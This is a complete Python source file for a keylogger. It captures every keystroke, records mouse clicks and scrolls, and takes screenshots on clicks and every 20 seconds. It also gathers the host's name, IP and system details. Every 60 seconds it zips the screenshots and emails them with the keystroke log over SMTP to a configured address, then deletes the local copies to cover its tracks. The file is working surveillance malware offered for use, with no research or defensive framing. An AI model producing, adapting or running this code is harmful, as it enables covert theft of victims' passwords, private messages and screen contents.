import threading # For running multiple threads
import time
import logging # For logging
import socket
import platform
import smtplib # For sending emails
import os
import zipfile # For creating zip files
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from pynput import keyboard, mouse # For capturing keyboard and mouse events
import pyautogui # For taking screenshots
from datetime import datetime
from dotenv import load_dotenv
load_dotenv()


# Configuration for SMTP server and email
EMAIL_ADDRESS = os.environ.get("EMAIL") or ""
EMAIL_PASSWORD = os.environ.get("PASSWORD") or "password"
SEND_REPORT_EVERY = 60  # in seconds

# Initialize logging settings
logging.basicConfig(level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

class KeyLogger:
    def __init__(self, time_interval, email, password):
        """
        Initialize the keylogger with the specified time interval and email credentials
        """
        self.interval = time_interval
        self.log = "KeyLogger Started...\n"
        self.email = email
        self.password = password
        self.lock = threading.Lock()
        self.running = True
        self.system_information()

        self.session_id = f"{datetime.now().strftime('%Y%m%d_%H%M%S')}-{platform.node()}"
        logging.info(f"Session ID: {self.session_id}")
        self.screenshot_count = 0 # Counter for screenshots taken in the current iteration
        self.screenshot_filenames = []
        self.last_click_time = 0
        self.size = pyautogui.size() # Get screen resolution
        height = self.size.height
        width = self.size.width
        # make height 720p, and adjust width accordingly
        self.size = (int(width * 720 / height), 720)

    def append_log(self, string):
        # Append to log with thread safety
        with self.lock:
            self.log += string

    def save_data(self, key):
        # Save key press data to log
        try:
            current_key = key.char if hasattr(key, 'char') and key.char is not None else f" [{key.name}] "
        except Exception:
            current_key = f" [{getattr(key, 'name', 'unknown')}] "
        self.append_log(current_key)

    def save_mouse_click(self, x, y, button, pressed):
        # Save mouse click data to log and capture screenshot
        if pressed:
            current_time = time.time()
            if current_time - self.last_click_time > 5: # only capture screenshot if last click was more than 5 seconds ago
                self.append_log(f"Mouse clicked at ({x}, {y}) with {button}\n")
                self.capture_screenshot()
                self.last_click_time = current_time

    def save_mouse_scroll(self, x, y, dx, dy):
        # Save mouse scroll data to log
        self.append_log(f"Mouse scrolled at ({x}, {y}) with delta ({dx}, {dy})\n")

    def capture_screenshot(self):
        # Capture screenshot and save to file
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            self.screenshot_count += 1
            screenshot_filename = f"screenshot_{timestamp}_{self.screenshot_count}.png"
            screenshot = pyautogui.screenshot()
            screenshot = screenshot.resize((self.size))
            screenshot.save(screenshot_filename)
            self.screenshot_filenames.append(screenshot_filename)
        except Exception as e:
            logging.error(f"Screenshot capture failed: {e}")

    def create_zip(self, filenames, zip_filename):
        try:
            with zipfile.ZipFile(zip_filename, 'w') as zipf:
                for file in filenames:
                    zipf.write(file)
            return zip_filename
        except Exception as e:
            logging.error(f"Failed to create zip file: {e}")
            return None

    def send_mail(self, subject, body, attachments=None, purpose="Not specified"):
        """
        Send an email with the specified subject, body, and attachments
        """
        smtp_host = os.environ.get("SMTP_HOST") or "smtp.zoho.in"
        port = os.environ.get("SMTP_PORT") or 587
        # We are using TLS encryption for SMTP

        # Create a MIME email message
        msg = MIMEMultipart()
        msg['From'] = self.email
        msg['To'] = os.environ.get("TO_EMAIL") or self.email
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain'))

        if attachments:
            for attachment in attachments:
                try:
                    with open(attachment, "rb") as file:
                        part = MIMEBase('application', 'octet-stream')
                        part.set_payload(file.read())
                    encoders.encode_base64(part)
                    part.add_header('Content-Disposition', f'attachment; filename="{os.path.basename(attachment)}"')
                    msg.attach(part)
                except Exception as e:
                    logging.error(f"Failed to attach {attachment}: {e}")

        try:
            server = smtplib.SMTP(smtp_host, port, timeout=10)
            server.starttls()
            server.login(self.email, self.password)
            server.send_message(msg)
            server.quit()
            logging.info("Email sent successfully")
        except Exception as e:
            logging.error(f"Email sending failed: {e}")

    def report(self):
        # Report keylogger log and screenshots
        if not self.running:
            return
        with self.lock:
            current_log = self.log
            self.log = ""

        # Build the email body with the session id and keylogger log
        email_body = f"Session ID: {self.session_id}\n\n{current_log}"
        zip_filename = f"screenshots_{self.session_id}.zip"
        zip_filepath = self.create_zip(self.screenshot_filenames, zip_filename)

        attachments = [zip_filepath] if zip_filepath else []

        if current_log or attachments:
            self.send_mail("Keylogger Report", email_body, attachments=attachments, purpose="Keylogger report")

        # Cleanup screenshot files and zip file
        for filename in self.screenshot_filenames:
            if os.path.exists(filename):
                os.remove(filename)
        if zip_filepath and os.path.exists(zip_filepath):
            os.remove(zip_filepath)
        self.screenshot_filenames.clear()
        self.screenshot_count = 0

        # Schedule next report
        t = threading.Timer(self.interval, self.report)
        t.daemon = True
        t.start()

    def periodic_screenshot(self):
        # Capture screenshot every 20 seconds
        if not self.running:
            return
        self.capture_screenshot()
        t = threading.Timer(20, self.periodic_screenshot)
        t.daemon = True
        t.start()

    def system_information(self):
        try:
            hostname = socket.gethostname()
            ip_address = socket.gethostbyname(hostname)
            external_ip = None
            try:
                external_ip = socket.gethostbyname(socket.gethostname())
            except Exception as e:
                logging.error(f"Failed to get external IP: {e}")
            ip_address = external_ip if external_ip else ip_address
            processor = platform.processor()
            system = platform.system() + " " + platform.version()
            machine = platform.machine()
            info = (f"Hostname: {hostname}\n"
                    f"IP Address: {ip_address}\n"
                    f"Processor: {processor}\n"
                    f"System: {system}\n"
                    f"Machine: {machine}\n\n")
            self.append_log(info)
        except Exception as e:
            logging.error(f"System information retrieval failed: {e}")

    def run(self):
        # Start periodic reporting (which now includes both keylogger log and screenshot)
        self.report()

        # Start periodic screenshot capture
        self.periodic_screenshot()

        # Start keyboard listener for capturing keystrokes
        keyboard_listener = keyboard.Listener(on_press=self.save_data)
        keyboard_listener.start()

        # Start mouse listener for capturing mouse events
        mouse_listener = mouse.Listener(on_click=self.save_mouse_click, on_scroll=self.save_mouse_scroll)
        mouse_listener.start()

        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.running = False
            keyboard_listener.stop()
            mouse_listener.stop()

    def __del__(self):
        self.running = False

if __name__ == '__main__':
    keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
    keylogger.run()